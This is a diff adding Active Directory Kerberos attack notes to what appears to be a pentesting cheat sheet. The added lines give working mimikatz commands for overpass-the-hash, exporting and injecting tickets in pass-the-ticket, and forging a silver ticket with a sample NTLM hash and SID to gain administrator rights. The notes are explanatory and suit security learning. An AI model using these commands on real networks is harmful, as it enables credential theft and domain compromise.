@@ -21,14 +21,54 @@ We can for example use overpass the hash through [mimikatz](https://github.com/g
 mimikatz # sekurlsa::pth /user:user1 /domain:contoso.com /ntlm:<ntlm_hash> /run:PowerShell.exe
 ```
 
+Once we have the new powershell session, we can authenticate to any AD resource to obtain a TGT, here's an example:
+
+```
+PS C:\> klist  -> no TGT for the user1
+
+PS C:\> net use \\dc01.contoso.com
+
+PS C:\> klist -> TGT for the user1
+```
+
 **PASS THE TICKET:**
 
+The pass-the-ticket technique abuses the TGS, which can be exported and injected somewhere else.
 
+```
+Listing tickets with mimikatz:
+
+mimikatz # kerberos::list
+
+
+Exporting all tickets(TGTs and TGSs) with mimikatz:
+
+mimikatz # sekurlsa::tickets /export   -> note that the TGTs can only be used from the machine they where generated on, the TGSs can be used elsewhere
+
+
+Injecting some ticket into memoeyr with mimikatz:
+
+mimikatz # kerberos::ptt 'C:\ticket.kirbi'
+```
 
 **GOLDEN TICKETS:**
 
 
 **SILVER TICKETS:**
+
+This technique consists of crafting a TGS with the password hash of the SPN. The interesting part about this TGS, is that we can modify our permissions(such as user id or group id) stating that we are local administrator/domain admin/etc on the server where the SPN we have compromised is running its service. 
+
+In our example, our compromimsed SPN will we "svc_mssql", its NTLM password hash will be this "1BF1DE6AEDB12AE1E548210EDBF3511E", its FQDN will be "MSSQL/server.contoso.com" and the SID of the trike user will be "S-1-5-21-2602875597-2787548311-2599479668-1204"
+
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::list
+
+mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:S-1-5-21-2602875597-2787548311-2599479668 /target:server.contoso.com /service:MSSQL /rc4:1BF1DE6AEDB12AE1E548210EDBF3511E /ptt
+```
+(note that in the sid parameter we didn't specify the RID of the trike user, since mimikatz will automatically set our RID to 500 which equals to both local administrator and domain admin)
 
 **BRONZE TICKETS:**
 
